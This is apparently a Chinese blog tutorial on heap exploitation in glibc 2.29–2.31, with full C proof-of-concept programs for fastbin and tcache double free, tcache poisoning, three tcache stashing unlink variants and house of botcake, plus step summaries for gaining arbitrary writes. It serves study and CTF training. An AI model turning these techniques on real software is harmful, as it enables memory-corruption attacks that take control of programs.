# glibc-2.29~2.31

## fastbin_double_free

需要构造：前一个释放堆块 old，与当前释放堆块 p 有 old != p。

`fastbin double free` 的 poc 利用如下：

```
#include<stdio.h>
#include<stdlib.h>
#include<inttypes.h>
int main()
{
    /*this is double free related security mechanisms in glibc 2.29.
     *	if (__builtin_expect (old == p, 0))
	  malloc_printerr ("double free or corruption (fasttop)");
    * */
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    printf("fastbin_double_free can help you achieve \"arbitrary address writes\"\n");

    void *q,*r,*d;
    void *p[7];
    printf("First of all ,we need to Apply for heap blocks of the same size to consume tcache!\n");
    for(int i=0;i<7;i++)
    {
        p[i] = malloc(0x10);
        printf("p[%d]  ===>  %p\n",i,p[i]);
    }
    q = malloc(0x10);
    r = malloc(0x10);
    printf("now , we need to free 7 heap blocks to populate tcache linked list!\n");
    for(int i=0;i<7;i++)
    {
        printf("now free p[%d]  ===>  %p\n",i,p[i]);
        free(p[i]);
        p[i] = 0;
    }
    printf("now ,Our free heap blocks will be put into fastbin\n");
    printf("now free q  ===>  %p\n",q);
    free(q);
    printf("in order to achieve double free , we need to free another block to bypass check in glibc 2.29 !\n");
    printf("now free r  ===>  %p\n",r);
    free(r);
    printf("now we free q again!\n");
    printf("now free q  ===>  %p\n",q);
    free(q);
    printf("OK,we already achieve double free in glibc 2.29.!\n");
}
```

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220419185557111.png)**image-20220419185557111**

申请出九个堆块。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220419185812476.png)**image-20220419185812476**

释放掉七个堆块，填满 tcache bin。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220419185951969.png)**image-20220419185951969**

再释放 p、q 两个堆块，由于 tcache bin 满了，进入到 fastbin 中

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220419190144978.png)**image-20220419190144978**

### fastbin_double_free 利用总结

效果：实现任意地址写

- 释放七个堆块填满 tcache bin。
- 再释放两个堆块进入 fastbin，按照 p-q-p 的顺序释放，即可形成 double free。

## **tcache_double_free**

poc如下：

```
#include<stdio.h>
#include<stdlib.h>
#include<inttypes.h>
int main(int argc,char **argv)
{
    //glibc 2.29 Security Mechanism
    /*
     *if (__glibc_unlikely (e->key == tcache))
	  {
	    tcache_entry *tmp;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx];
		 tmp;
		 tmp = tmp->next)
	      if (tmp == e)
		malloc_printerr ("free(): double free detected in tcache 2");
	    // If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  
	  }
     */
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    printf("tcache_double_free can help you achieve \"arbitrary address writes\"\n");
    void *p,*q,*r,*d;
    p = malloc(0x10);
    free(p);
    printf("now we already free p = %p\n",p);
    printf("we can change its key to help us achieve double free\n");
    printf("its key = %p,now\n",*(uint64_t *)(p+8));
    *(uint64_t *)(p + 8) = 0x122220;
    printf("after we change,its key = %p\n",*(uint64_t *)(p+8));
    printf("so we can achieve double free!");
    free(p);
    printf("now we already achieve double free in glibc 2.29");
    return 0;
}
```

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220419193416703.png)**image-20220419193416703**

2.29以后的版本，在释放堆块的 bk 位置将会填上 tcache 的地址作为一个 key，如果 key == tcache 则说明堆块已释放。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220419193649480.png)**image-20220419193649480**

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220419193807297.png)**image-20220419193807297**

将这个key值改掉即可与之前版本一般，直接再次释放该堆块形成 double free。

### tcache_double_free 利用总结

效果：实现任意地址写

- 释放一个堆块。
- 修改堆块 bk 位置上的 key。
- 再次释放该堆块。

## tcache_poisoning

在 glibc-2.31 中，tcache count 的数量不能小于 0，否则将无法分配堆块。

poc如下：

```
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main()
{
	// disable buffering
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	printf("This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"
		   "returning a pointer to an arbitrary location (in this case, the stack).\n"
		   "The attack is very similar to fastbin corruption attack.\n");
	printf("After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n"
		   "We have to create and free one more chunk for padding before fd pointer hijacking.\n\n");

	size_t stack_var;
	printf("The address we want malloc() to return is %p.\n", (char *)&stack_var);

	printf("Allocating 2 buffers.\n");
	intptr_t *a = malloc(128);
	printf("malloc(128): %p\n", a);
	intptr_t *b = malloc(128);
	printf("malloc(128): %p\n", b);

	printf("Freeing the buffers...\n");
	free(a);
	free(b);

	printf("Now the tcache list has [ %p -> %p ].\n", b, a);
	printf("We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
		   "to point to the location to control (%p).\n", sizeof(intptr_t), b, &stack_var);
	b[0] = (intptr_t)&stack_var;
	printf("Now the tcache list has [ %p -> %p ].\n", b, &stack_var);

	printf("1st malloc(128): %p\n", malloc(128));
	printf("Now the tcache list has [ %p ].\n", &stack_var);

	intptr_t *c = malloc(128);
	printf("2nd malloc(128): %p\n", c);
	printf("We got the control\n");

	assert((long)&stack_var == (long)c);
	return 0;
}
```

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220419222640503.png)**image-20220419222640503**

申请出两个堆块，然后再将其释放，顺序为 b -> a。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220419223405043.png)**image-20220419223405043**

修改 b 的 fd 指针指向要修改的内容，然后只需要将堆块分配即可。

### tcache_poisoning 利用总结

效果：实现任意地址写

- 释放堆块 b -> a
- 修改 b 的指针指向想要分配堆块的地址

相比与之前版本可以让 count 为负值，构造链表尾部的堆块；glibc-2.31需要在前一个堆块开始构造，绕过 count 的限制，

## **tcache_stashing_unlink**

libc-2.29开始，出现了一种叫 stash 的机制，基本原理就是当调用 _int_malloc 时，如果从 smallbin 或者 fastbin 中取出 chunk之后，对应大小的 tcache 没有满，就会把剩下的 bin 放入 tcache 中

poc如下：

```
#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>

static uint64_t victim = 0;

int main(int argc, char **argv){
	setbuf(stdout, 0);
	setbuf(stderr, 0);

	char *t1;
	char *s1, *s2, *pad;
	char *tmp;

	printf("You can use this technique to write a big number to arbitrary address instead of unsortedbin attack\n");

	printf("\n1. need to know heap address and the victim address that you need to attack\n");

	tmp = malloc(0x1);
	printf("victim's address: %p, victim's vaule: 0x%lx\n", &victim, victim);
	printf("heap address: %p\n", tmp-0x260);

	printf("\n2. choose a stable size and free six identical size chunks to tcache_entry list\n");
	printf("Here, I choose the size 0x60\n");
	for(int i=0; i<6; i++){
		t1 = calloc(1, 0x50);
		free(t1);
	}

	printf("Now, the tcache_entry[4] list is %p --> %p --> %p --> %p --> %p --> %p\n", 
		t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4, t1-0x60*5);

	printf("\n3. free two chunk with the same size like tcache_entry into the corresponding smallbin\n");

	s1 = malloc(0x420);
	printf("Alloc a chunk %p, whose size is beyond tcache size threshold\n", s1);
	pad = malloc(0x20);
	printf("Alloc a padding chunk, avoid %p to merge to top chunk\n", s1);
	free(s1);
	printf("Free chunk %p to unsortedbin\n", s1);
	malloc(0x3c0);
	printf("Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n");
	malloc(0x100);
	printf("Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n");
	printf("chunk %p is in smallbin[4], whose size is 0x60\n", s1+0x3c0);

	printf("Repeat the above steps, and free another chunk into corresponding smallbin\n");
	printf("A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n");
	s2 = malloc(0x420);
	pad = malloc(0x80);
	free(s2);
	malloc(0x3c0);
	malloc(0x100);
	printf("chunk %p is in smallbin[4], whose size is 0x60\n", s2+0x3c0);
	printf("smallbin[4] list is %p <--> %p\n", s2+0x3c0, s1+0x3c0);

	printf("\n4. overwrite the first chunk in smallbin[4]'s bk pointer to &victim-0x10 address, the first chunk is smallbin[4]->fd\n");
	
	printf("Change %p's bk pointer to &victim-0x10 address: 0x%lx\n", s2+0x3c0, (uint64_t)(&victim)-0x10);
	*(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&victim)-0x10;

	printf("\n5. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n");

	calloc(1, 0x50);

	printf("Finally, the victim's value is changed to a big number\n");
	printf("Now, victim's value: 0x%lx\n", victim);
	return 0;
}	
```

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220426210920666.png)**image-20220426210920666**

目标地址0x555555558050，值为0。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220426211028509.png)**image-20220426211028509**

释放六个大小为0x60的堆块进入 tcache bin 里面。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220426211149437.png)**image-20220426211149437**

申请两个堆块，一个大于tcache[max]，另一个防止合并。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220426211255158.png)**image-20220426211255158**

释放大堆块进入到 unsorted bin 中，再申请一个计算好的堆块，让大堆块进行分割，剩下的大小与之前申请的堆块大小一致，再申请一个更大的堆块，让这个堆块进入到 small bin 中。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220426211447839.png)**image-20220426211447839**

做一遍类似的操作，但是这次阻止合并堆块的大小要大于定好的堆块大小，防止 small chunk 进行分配。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220426211614394.png)**image-20220426211614394**

一样的操作，再让一个堆块进入到同样size序列的 small bin 中。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220426211858473.png)**image-20220426211858473**

修改后进入 small bin 的那个堆块的 bk 指针为 目标地址 - 0x10。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220426212131959.png)**image-20220426212131959**

最后使用 calloc 申请一个同等 size 的堆块，即可在目标地址上写入一个大数。

### tcache_stashing_unlink利用总结

效果：往任意地址里写入一个 0x7f 头的大数，unsorted bin attack 的替代手法。

- 选定一个 n = size，释放六个大小为 n 的堆块进入到 tcache bin
- 精心准备让一个堆块进入到 unsorted bin 中，同时使得这个堆块的 size 变为 n，再让其进入到 small bin 中。
- 再重复构造一个同样 size 为 n 的堆块进入 small bin 后，修改该堆块的 bk 指针为 目标地址-0x10
- 使用 calloc 申请一个 size 为 n 的堆块

注：被修改 bk 指针的堆块，fd 是不能被改变的，所以需要获取到堆地址

## **tcache_stashing_unlink+**

poc如下：

```
#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>

static uint64_t victim[4] = {0, 0, 0, 0};

int main(int argc, char **argv){
	setbuf(stdout, 0);
	setbuf(stderr, 0);

	char *t1;
	char *s1, *s2, *pad;
	char *tmp;

	printf("You can use this technique to get a tcache chunk to arbitrary address\n");

	printf("\n1. need to know heap address and the victim address that you need to attack\n");

	tmp = malloc(0x1);
	printf("victim's address: %p, victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n", 
		&victim, victim[0], victim[1], victim[2], victim[3]);
	printf("heap address: %p\n", tmp-0x260);

	printf("\n2. change victim's data, make victim[1] = &victim, or other address to writable address\n");
	victim[1] = (uint64_t)(&victim);
	printf("victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n", 
		victim[0], victim[1], victim[2], victim[3]);


	printf("\n3. choose a stable size and free five identical size chunks to tcache_entry list\n");
	printf("Here, I choose the size 0x60\n");
	for(int i=0; i<5; i++){
		t1 = calloc(1, 0x50);
		free(t1);
	}

	printf("Now, the tcache_entry[4] list is %p --> %p --> %p --> %p --> %p\n", 
		t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);

	printf("\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n");

	s1 = malloc(0x420);
	printf("Alloc a chunk %p, whose size is beyond tcache size threshold\n", s1);
	pad = malloc(0x20);
	printf("Alloc a padding chunk, avoid %p to merge to top chunk\n", s1);
	free(s1);
	printf("Free chunk %p to unsortedbin\n", s1);
	malloc(0x3c0);
	printf("Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n");
	malloc(0x100);
	printf("Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n");
	printf("chunk %p is in smallbin[4], whose size is 0x60\n", s1+0x3c0);

	printf("Repeat the above steps, and free another chunk into corresponding smallbin\n");
	printf("A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n");
	s2 = malloc(0x420);
	pad = malloc(0x80);
	free(s2);
	malloc(0x3c0);
	malloc(0x100);
	printf("chunk %p is in smallbin[4], whose size is 0x60\n", s2+0x3c0);
	printf("smallbin[4] list is %p <--> %p\n", s2+0x3c0, s1+0x3c0);

	printf("\n5. overwrite the first chunk in smallbin[4]'s bk pointer to &victim-0x10 address, the first chunk is smallbin[4]->fd\n");
	printf("Change %p's bk pointer to &victim-0x10 address: 0x%lx\n", s2+0x3c0, (uint64_t)(&victim)-0x10);
	*(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&victim)-0x10;

	printf("\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n");

	calloc(1, 0x50);
	printf("Now, the tcache_entry[4] list is %p --> %p --> %p --> %p --> %p --> %p --> %p\n", 
		&victim, s2+0x3d0, t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);

	printf("Apply to tcache_entry[4], you can get a pointer to victim address\n");
	
	uint64_t *r = (uint64_t*)malloc(0x50);
	r[0] = 0xaa;
	r[1] = 0xbb;
	r[2] = 0xcc;
	r[3] = 0xdd;

	printf("victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n", 
		victim[0], victim[1], victim[2], victim[3]);
	
	return 0;
}
```

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220426221322819.png)**image-20220426221322819**

目标地址为0x555555558060，值为0。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220426221553008.png)**image-20220426221553008**

在 victim[1] 写入 victim 的地址。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220426221722290.png)**image-20220426221722290**

释放五个size为0x60的堆块进入tcache bin中。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220426221846227.png)**image-20220426221846227**

跟 tcache_stashing_unlink 中的一样的做法，让一个size也为0x60的堆块进入到small bin中。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220426222049041.png)**image-20220426222049041**

再制造一个size为0x60的堆块进入到smallbin中。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220426222256149.png)**image-20220426222256149**

把后进入smallbin的堆块bk修改为&victim-0x10，fd保持不变。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220426222527079.png)**image-20220426222527079**

再使用calloc申请size为0x60的堆块，此时victim也将被放入到tcache中。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20220426222958162.png)**image-20220426222958162**

此时可以把victim申请出来，获得任意写的能力。

### tcache_stashing_unlink+利用总结

将一个任意地址当做堆块放入到 tcache 中。

- 选定一个 n = size，释放五个大小为 n 的堆块进入到 tcache bin
- 精心准备让一个堆块进入到 unsorted bin 中，同时修改这个堆块的 size 变为 n，再让其进入到 small bin 中。
- 再重复构造一个同样 size 为 n 的堆块进入 small bin 后，修改该堆块的 bk 指针为 &target - 0x10
- 在 &target + 8 的位置要存放有任意一个可写的地址，满足检查。
- 使用 calloc 申请一个 size 为 n 的堆块
- 此时 target 将被放入 tcache 中。

注：被修改 bk 指针的堆块，fd 是不能被改变的，所以需要获取到堆地址。

## tcache stash unlink attack++

这个方法与tcache_stashing_unlink+几乎相同。

poc如下：

```
#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>

static uint64_t victim[4] = {0, 0, 0, 0};
static uint64_t victim2 = 0;

int main(int argc, char **argv){
	setbuf(stdout, 0);
	setbuf(stderr, 0);

	char *t1;
	char *s1, *s2, *pad;
	char *tmp;

	printf("You can use this technique to get a tcache chunk to arbitrary address, at the same time, write a big number to arbitrary address\n");

	printf("\n1. need to know heap address, the victim address that you need to get chunk pointer and the victim address that you need to write a big number\n");

	tmp = malloc(0x1);
	printf("victim's address: %p, victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n", 
		&victim, victim[0], victim[1], victim[2], victim[3]);
	printf("victim2's address: %p, victim2's value: 0x%lx\n",
		&victim2, victim2);
	printf("heap address: %p\n", tmp-0x260);

	printf("\n2. change victim's data, make victim[1] = &victim2-0x10\n");
	victim[1] = (uint64_t)(&victim2)-0x10;
	printf("victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n", 
		victim[0], victim[1], victim[2], victim[3]);


	printf("\n3. choose a stable size and free five identical size chunks to tcache_entry list\n");
	printf("Here, I choose the size 0x60\n");
	for(int i=0; i<5; i++){
		t1 = calloc(1, 0x50);
		free(t1);
	}

	printf("Now, the tcache_entry[4] list is %p --> %p --> %p --> %p --> %p\n", 
		t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);

	printf("\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n");

	s1 = malloc(0x420);
	printf("Alloc a chunk %p, whose size is beyond tcache size threshold\n", s1);
	pad = malloc(0x20);
	printf("Alloc a padding chunk, avoid %p to merge to top chunk\n", s1);
	free(s1);
	printf("Free chunk %p to unsortedbin\n", s1);
	malloc(0x3c0);
	printf("Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n");
	malloc(0x100);
	printf("Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n");
	printf("chunk %p is in smallbin[4], whose size is 0x60\n", s1+0x3c0);

	printf("Repeat the above steps, and free another chunk into corresponding smallbin\n");
	printf("A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n");
	s2 = malloc(0x420);
	pad = malloc(0x80);
	free(s2);
	malloc(0x3c0);
	malloc(0x100);
	printf("chunk %p is in smallbin[4], whose size is 0x60\n", s2+0x3c0);
	printf("smallbin[4] list is %p <--> %p\n", s2+0x3c0, s1+0x3c0);

	printf("\n5. overwrite the first chunk in smallbin[4]'s bk pointer to &victim-0x10 address, the first chunk is smallbin[4]->fd\n");
	printf("Change %p's bk pointer to &victim-0x10 address: 0x%lx\n", s2+0x3c0, (uint64_t)(&victim)-0x10);
	*(uint64_t*)((s2+0x3c0)+0x18) = (uint64_t)(&victim)-0x10;

	printf("\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n");

	calloc(1, 0x50);
	printf("Now, the tcache_entry[4] list is %p --> %p --> %p --> %p --> %p --> %p --> %p\n", 
		&victim, s2+0x3d0, t1, t1-0x60, t1-0x60*2, t1-0x60*3, t1-0x60*4);

	printf("Apply to tcache_entry[4], you can get a pointer to victim address\n");
	
	uint64_t *r = (uint64_t*)malloc(0x50);
	r[0] = 0xaa;
	r[1] = 0xbb;
	r[2] = 0xcc;
	r[3] = 0xdd;

	printf("victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n", 
		victim[0], victim[1], victim[2], victim[3]);
	printf("victim2's value: 0x%lx\n",
		victim2);

	return 0;
}	
```

该手法就是第一种和第二种的叠加手法，就不细说了，直接总结手法。

### tcache_stashing_unlink++利用总结

将一个任意地址当做堆块放入到 tcache 中，同时可以往一个任意地址写入一个 libc 地址。

- 选定一个 n = size，释放五个大小为 n 的堆块进入到 tcache bin；
- 精心准备让一个堆块进入到 unsorted bin 中，同时使得这个堆块的 size 变为 n，再让其进入到 small bin 中；
- 再重复构造一个同样 size 为 n 的堆块进入 small bin 后，修改该堆块的 bk 指针为 &target1 - 0x10；
- 在 &target1 + 8 的位置填写 &target2 - 0x10；
- 使用 calloc 申请一个 size 为 n 的堆块；
- 此时 target1 将被放入 tcache 中，同时对 target2 写入一个 libc 地址。

注：被修改 bk 指针的堆块，fd 是不能被改变的，所以需要获取到堆地址。

## **house_of_botcake**

poc：

```
#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>

static uint64_t victim = 0;
int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    printf("Inspired by how2heap\n");
    printf("You can use this technique to create chunk overlap, only relies on double free.\n");

    printf("\n1. Alloc 7 chunks to fill up tcache list\n");

    char *x[7];
    for(int i=0; i<7; i++){
        x[i] = malloc(0x100);
    }

    printf("\n2. Prepare two chunk with the same size as befor, for consolidation in unsortedbin\n");
    
    char *a = malloc(0x100);
    char *b = malloc(0x100);

    printf("Padding chunk to prevent consolidation\n");
    malloc(0x10);
    
    printf("\n3. Fill in the tcache list and consolidation two prepared chunk in unsortedbin\n");
    for(int i=0; i<7; i++){
        free(x[i]);
    }   

    free(b);
    free(a);
    
    printf("\n4. Get a chunk from tcache list and make chunk overlap\n");
    malloc(0x100);

    free(b);
    printf("Now, chunk %p will be freed into tcache list\n", b);    
    
    char* res = malloc(0x130);
    printf("Size is not matched with tcache list, so get chunk from unsortedbin, which makes chunk overlap\n");
    
    *(uint64_t*)(res+0x110) = (uint64_t)(&victim);

    printf("Now, you can control tcache list to alloc arbitrary address\n");
    malloc(0x100);
    
    char *target = malloc(0x100);
    printf("Before attack, victim's value: 0x%lx\n", victim);
    *(uint64_t*)target = 0xdeadbeef;
    printf("After attack, victim's value: 0x%lx\n", victim);

    return 0;
}
```

释放 7 个 0x100 的堆块填满 tcache。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20221117131357835.png)**image-20221117131357835**

再释放两个同样为 0x100 的堆块，这两个堆块会进行合并。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20221117132805303.png)**image-20221117132805303**

申请一个 0x100 的堆块，空出一个 tcache bin。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20221117133743383.png)**image-20221117133743383**

然后利用 UAF 再次释放合并进入到 unsorted bin 的堆块，造成了存在一个堆块即在 tcache 里，又在 unsorted bin 里。这里的堆块不能选择释放头部，因为那样会变成让 0x220 的堆块进入到 tcache。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20221117134045922.png)**image-20221117134045922**

申请一个大于 0x100 的堆块，绕开 tcache，而获得到了 unsorted bin 里的堆块，但是这个堆块可以覆盖存在于 tcache 里的堆块，最终造成可以地址分配堆块，任意地址写。

[![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)](https://shoucheng3.github.io/2022/03/14/2022-03-14-glibc-2.31版本利用/image-20221117134330799.png)**image-20221117134330799**

### house_of_botcake利用总结

前提：拥有 UAF

- 释放七个 size 满足进入 unsorted bin 的堆块填满 tcache，再释放两个同样 size 的堆块 a b (a前，b后)进入到 unsorted bin
- 申请回一个 tcache，然后利用 UAF 释放堆块 b
- 申请一个大于 size 的堆块，此时可以通过该堆块完成对 b 堆块的覆盖，并且 b 堆块仍然在 tcache 里。